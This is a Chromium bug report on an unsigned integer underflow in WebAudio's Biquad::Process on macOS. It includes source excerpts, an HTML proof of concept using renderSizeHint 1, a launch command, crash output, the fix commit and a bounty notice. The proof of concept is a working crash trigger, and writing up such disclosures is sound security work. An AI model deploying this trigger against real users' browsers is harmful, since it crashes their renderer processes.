# Out-of-Bounds Read in Biquad::Process on macOS

| Field | Value |
|-------|-------|
| **Issue ID** | [485397283](https://issues.chromium.org/issues/485397283) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>WebAudio |
| **Platforms** | Mac |
| **Reporter** | je...@gmail.com |
| **Assignee** | mj...@chromium.org |
| **Created** | 2026-02-18 |
| **Bounty** | $2,000.00 |

## Description

## Summary

The `Biquad::Process` method in Chromium's WebAudio implementation contains a macOS-specific code path that reads filter history from `dest_p[frames_to_process - 2]`, where `frames_to_process` is `uint32_t`. When the `WebAudioConfigurableRenderQuantum` Origin Trial feature is active and `renderSizeHint` is set to 1, `frames_to_process` becomes 1, causing the subtraction `1 - 2` to underflow to `0xFFFFFFFF`. This results in an out-of-bounds read at approximately 16 GB past the destination buffer, crashing the renderer process with a `SIGBUS` signal on macOS.

## Root Cause

The `Biquad` class implements IIR filtering for the `BiquadFilterNode` in the Web Audio API. On macOS, the `Process` method has an optimized code path that uses Apple's Accelerate framework (vDSP) for filter computation. After calling `ProcessFast` to perform the actual filtering, the method saves two history samples from the output buffer for use in the next render quantum:

```
// third_party/blink/renderer/platform/audio/biquad.cc
void Biquad::Process(const float* source_p,
                     float* dest_p,
                     uint32_t frames_to_process) {
  if (HasSampleAccurateValues()) {
    // ... sample-accurate path (not affected) ...
  } else {
#if BUILDFLAG(IS_MAC)
    double* input_p = input_buffer_.Data();
    double* output_p = output_buffer_.Data();

    input_p[0] = x2_;
    input_p[1] = x1_;
    output_p[0] = y2_;
    output_p[1] = y1_;

    ProcessFast(source_p, dest_p, frames_to_process);

    x1_ = input_p[1];
    x2_ = input_p[0];
    y1_ = dest_p[frames_to_process - 1];
    y2_ = dest_p[frames_to_process - 2];   // underflow when frames_to_process == 1
#else
    // ... non-Mac loop path (not affected) ...
#endif
  }
}

```

The parameter `frames_to_process` is declared as `uint32_t`. When it equals 1, the expression `frames_to_process - 2` does not produce `-1` as a signed result; instead, the unsigned subtraction wraps around to `0xFFFFFFFF`. The subsequent array access `dest_p[0xFFFFFFFF]` computes a byte offset of `0xFFFFFFFF * sizeof(float) = 0x3FFFFFFFC`, approximately 16 GB past the start of the destination buffer. This address is virtually guaranteed to be unmapped, causing a `SIGBUS` on macOS ARM64.

This macOS-specific path is entered when `HasSampleAccurateValues()` returns false, which occurs whenever none of the `BiquadFilterNode`'s audio parameters (frequency, Q, gain, detune) have active automation timelines or incoming audio-rate connections. The `BiquadFilterHandler::Process` method explicitly sets this state:

```
// third_party/blink/renderer/modules/webaudio/biquad_filter_handler.cc
} else {
    // No sample-accurate values
    for (const auto& biquad : biquads_) {
        biquad->SetHasSampleAccurateValues(false);
        // ... set fixed filter coefficients ...
    }
}

for (unsigned i = 0; i < biquads_.size(); ++i) {
    biquads_[i]->Process(source_bus->Channel(i)->Data(),
                         destination_bus->Channel(i)->MutableData(),
                         frames_to_process);
}

```

The `frames_to_process` value originates from the render quantum size configured via `renderSizeHint`. When the `WebAudioConfigurableRenderQuantum` runtime feature is enabled, the user-supplied `renderSizeHint` is accepted after passing through `IsValidRenderQuantumSize`, which permits any value from 1 to `6 * sampleRate`:

```
// third_party/blink/renderer/platform/audio/audio_utilities.cc
uint32_t MinRenderQuantumSize() { return 1; }

uint32_t MaxRenderQuantumSize(float sample_rate) {
  return static_cast<uint32_t>(6 * sample_rate);
}

```

Setting `renderSizeHint` to 1 passes validation and propagates as `frames_to_process = 1` into `Biquad::Process`, triggering the unsigned integer underflow. The non-macOS code path (the `#else` branch) uses a signed `int n = frames_to_process` loop that naturally terminates without out-of-bounds access, so only macOS builds are affected. Note that `BUILDFLAG(IS_MAC)` applies to all macOS builds regardless of CPU architecture, meaning both Intel and Apple Silicon Macs are vulnerable.

## Reproduce

Save the following as `poc_biquad_macos_oob_read.html`:

```
<!DOCTYPE html>
<html>
<body>
<script>
async function trigger() {
  try {
    // renderSizeHint = 1: frames_to_process becomes uint32_t(1)
    // In Biquad::Process (macOS vDSP path, HasSampleAccurateValues()==false):
    //   y1_ = dest_p[frames_to_process - 1];  // dest_p[0] - OK
    //   y2_ = dest_p[frames_to_process - 2];  // uint32(1-2) = 0xFFFFFFFF -> OOB read
    const ctx = new OfflineAudioContext({
      numberOfChannels: 1,
      length: 64,
      sampleRate: 44100,
      renderSizeHint: 1
    });

    // BiquadFilterNode with default parameters (lowpass, no automations)
    // No automation -> HasSampleAccurateValues() == false -> enters macOS vDSP path
    const biquad = new BiquadFilterNode(ctx, { type: "lowpass" });

    const osc = new OscillatorNode(ctx, { frequency: 440 });

    osc.connect(biquad);
    biquad.connect(ctx.destination);
    osc.start();

    console.log("[*] renderSizeHint = 1, frames_to_process = 1 (uint32_t)");
    console.log("[*] Biquad::Process macOS path: dest_p[1-2] = dest_p[0xFFFFFFFF]");
    console.log("[*] Expected: heap-buffer-overflow READ on macOS ASAN build");
    console.log("[*] Starting offline rendering...");

    await ctx.startRendering();
    console.log("[!] Rendering completed (unexpected if on macOS ASAN)");
  } catch (e) {
    console.log("[!] Exception: " + e.name + ": " + e.message);
  }
}

trigger();
</script>
</body>
</html>

```

Download a macOS ARM64 ASAN build of Chromium and run with:

```
chromium-asan-1586336-mac-arm64/Chromium.app/Contents/MacOS/Chromium \
  --no-sandbox \
  --enable-blink-features=WebAudioConfigurableRenderQuantum \
  poc_biquad_macos_oob_read.html

```

The `--enable-blink-features` flag simulates the effect of a valid Origin Trial token for local reproduction. In a real attack scenario, the attacker would embed an Origin Trial token instead.

Output from execution confirms the crash:

```
Received signal 10 BUS_ADRALN 60340009d47c
 [0x000312433bcc]
 [0x000312407ae8]
 [0x000312433a00]
 [0x00019bfd56a4]
 [0x00032201abfc]
 [0x000322020f40]
 [0x000321f80dc8]
 [0x000321fa05b0]
 [0x000321f9dd50]
 [0x000321f9e1a0]
 [0x00032207f74c]
 [0x00032207e480]
 [0x000322080908]
 [0x0003122ce728]
 [0x000312336280]
 [0x00031233562c]
 [0x0003121b7f2c]
 [0x0003123375e0]
 [0x00031225ca24]
 [0x00030c1ab770]
 [0x000312402218]
 [0x000104d5566c]
 [0x00019bf9bc0c]
 [0x00019bf96b80]
[end of stack trace]

```

Signal 10 is `SIGBUS` on macOS, confirming the out-of-bounds read caused by the unsigned integer underflow in `Biquad::Process`. The renderer process is terminated immediately upon accessing the invalid memory address derived from `dest_p[0xFFFFFFFF]`.

## Timeline

### li...@chromium.org (2026-02-18)

This looks like an older part of the codebase so assigning to an OWNER, please feel free to reassign if there's a better person to take a look at this.

### mj...@chromium.org (2026-02-18)

Thank you for the report. Please note that this Origin Trial is currently closed to new registrations.

### ch...@google.com (2026-02-19)

Setting milestone because of s2 severity.

### ch...@google.com (2026-02-19)

Setting Priority to P1 to match Severity s2. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### mj...@chromium.org (2026-02-19)

We should be able to mitigate this by reading directly from output\_buffer\_ instead.

### dx...@google.com (2026-02-24)

Project: chromium/src  

Branch:  main  

Author:  Michael Wilson [mjwilson@chromium.org](mailto:mjwilson@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7596165>

Update Biquad for configurable render quantum

---


Expand for full commit details
```
     
    Use cached values directly for the Mac path instead of doing pointer 
    arithmetic, and also add a smoke test. 
     
    Bug: 485397283 
    Change-Id: I5194a8433ed4484e445b0dee7f3586a5baa89be4 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7596165 
    Reviewed-by: Hongchan Choi <hongchan@chromium.org> 
    Reviewed-by: Ian Kilpatrick <ikilpatrick@chromium.org> 
    Commit-Queue: Michael Wilson <mjwilson@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1589538}

```

---

Files:

- M `third_party/blink/renderer/platform/audio/biquad.cc`
- M `third_party/blink/web_tests/VirtualTestSuites`
- A `third_party/blink/web_tests/webaudio/BiquadFilter/biquad-render-size-hint.html`

---

Hash: [63799115a9800826e2162aef62166ee562479107](https://chromiumdash.appspot.com/commit/63799115a9800826e2162aef62166ee562479107)  

Date: Tue Feb 24 18:26:15 2026


---

### ch...@google.com (2026-02-25)

Merge review required: M146 has already been cut for stable release.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: lmenezes (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), govind (Mobile US), eakpobaro (Mobile EMEA)

### ch...@google.com (2026-02-25)

Merge review required: M145 is already shipping to stable.

Please answer the following questions so that we can safely process your merge request:

1. Why does your merge fit within the merge criteria for these milestones?

- Chrome Browser: <https://chromiumdash.appspot.com/branches>
- Chrome OS: <https://goto.google.com/cros-release-branch-merge-guidelines>

2. What changes specifically would you like to merge? Please link to Gerrit.
3. Have the changes been released and tested on canary?
4. Is this a new feature? If yes, is it behind a Finch flag and are experiments active in any release channels?
5. [Chrome OS only]: Was the change reviewed and approved by the Eng Prod Representative? <https://goto.google.com/cros-engprodcomponents>
6. If this merge addresses a major issue in the stable channel, does it require manual verification by the test team? If so, please describe required testing.

Please contact the milestone owner if you have questions.
Owners: andywu (ChromeOS), srinivassista (Desktop US), None (Desktop EMEA), harrysouders (Mobile US), eakpobaro (Mobile EMEA)

### dr...@chromium.org (2026-02-25)

Given this is only a read, I don't think we need to merge this.

### ch...@google.com (2026-06-03)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### sp...@google.com (2026-06-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $2000.00 for this report.

Rationale for this decision:
Baseline. User information disclosure.


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485397283)*
